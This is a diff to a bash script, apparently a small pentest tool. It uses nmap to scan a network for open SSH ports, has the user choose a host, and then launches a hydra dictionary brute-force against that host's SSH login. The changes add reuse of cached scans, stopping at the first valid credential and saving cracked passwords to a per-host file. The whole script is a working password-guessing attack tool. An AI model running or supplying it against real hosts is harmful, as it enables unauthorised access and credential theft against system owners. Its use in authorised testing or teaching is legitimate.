@@ -31,14 +31,40 @@ do
 done
 
 #---------------------------------Scann the network------------------------------
-#rm result/scanNetwork/scanSSH 2> /dev/null
+clear
+#if a last version exists, the user can choose whether to use it or to do a new scan
+lastVersionDate=$(date -r result/scanNetwork/scanSSH "+%D")
+#if a scan already exists
+if [ $? -eq 0 ]; then
+	#if the file has been created more than an hour ago
+	if [ $((`date +%s`-`date -r result/scanNetwork/scanSSH +%s`)) -gt 3600 ]; then
+		echo "too old"
+		rm result/scanNetwork/scanSSH 2> /dev/null
+		nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
+	else
+		echo "we found a recent ssh scan file."
+		echo "do you want to use it (press y)"
+		echo "or rescan the network (press n)?"
+		read ans
+		if [ $ans = "y" ]; then
+			echo -e $green"ok, let's go ahead!"$transparent
+			sleep 1
+		else
+			echo "nope"
+			rm result/scanNetwork/scanSSH 2> /dev/null
+			nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
+		fi
+	fi
+else
+	echo "nothing exist"
+	nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
+fi
 
 # -p 22 because 22 is the ssh port
 # -oG because we want a "grepable" output file, it's easier to manipulate with bash
 # for more information go to https://nmap.org/ or see nmap -h
 #nmap -p 22 $networkC -oG result/scanNetwork/scanSSH
-echo "sudo nmap -p 22 $networkC -oG result/scanNetwork/scanSSH"
-declare -a hostnamesArray
+
 hostnamesArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d "(" -f 2 | cut -d ")" -f 1))
 statesArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d " " -f 4 | cut -d "/" -f 2))
 addressArray=($(cat result/scanNetwork/scanSSH | grep "Ports" | cut -d " " -f 2))
@@ -90,8 +116,9 @@ done
 username=""
 password=""
 bool="0"
-echo "Now if you know the username press y"
-echo -e "Now if you$red don't know$transparent the username press n"
+clear
+echo "If you know the username press y"
+echo -e "If you$red don't know$transparent the username press n"
 read ans
 if [ $ans = "n" ]; then
 	dicoArray=($(ls conf/dico))
@@ -122,10 +149,11 @@ if [ $ans = "n" ]; then
 		fi
 	done
 	username=$PWD"/conf/dico/"${dicoArray[k]}
-	sed -i "1i${hostnamesArray[i]}" "$username"
-	echo "sed -i "1i${hostnamesArray[i]}" "$username""
-	bool="1"
-	username="-L '$username'"
+	##Uncomment this part to add by default the hostname in the user names dictionnary
+	#sed -i "1i${hostnamesArray[i]}" "$username"
+	#bool="1"
+	##
+	username="-L "$username
 
 
 else
@@ -136,9 +164,9 @@ else
 	username="-l "$username
 fi
 
-
-echo "Now if you know the password press y"
-echo -e "Now if you$red don't know$transparent the password press n"
+clear
+echo "If you know the password press y"
+echo -e "If you$red don't know$transparent the password press n"
 read ans
 echo $ans
 if [ $ans = "n" ] ; then
@@ -182,9 +210,15 @@ fi
 echo $username
 echo $password
 
-echo "hydra ${addressArray[i]} ssh -vV $username -P $password -e s -t 10"
-hydra ${addressArray[i]} ssh -vV $username $password -e s -t 10 -I
+echo "hydra ${addressArray[i]} ssh -V $username -P $password -e s -t 10"
+hydra ${addressArray[i]} ssh -vV $username $password -e s -t 10 -I -F -o "result/scanNetwork/pass_${hostnamesArray[i]}"
+
+##Uncomment this part to add by default the hostname in the user names dictionnary
 # Supress the line we hadded in the user dictionnary
-if [ bool = '1' ]; then
-	sed -i '1d' "conf/dico/${dicoArray[k]}"
-fi
+#if [ $bool = "1" ]; then
+#	sed -i '1d' "conf/dico/${dicoArray[k]}"
+#fi
+##
+echo -e $title"result saved in result/scanNetwork/pass_hostname"$transparent
+echo -e $green"press a button to  quit"$transparent
+read tmp
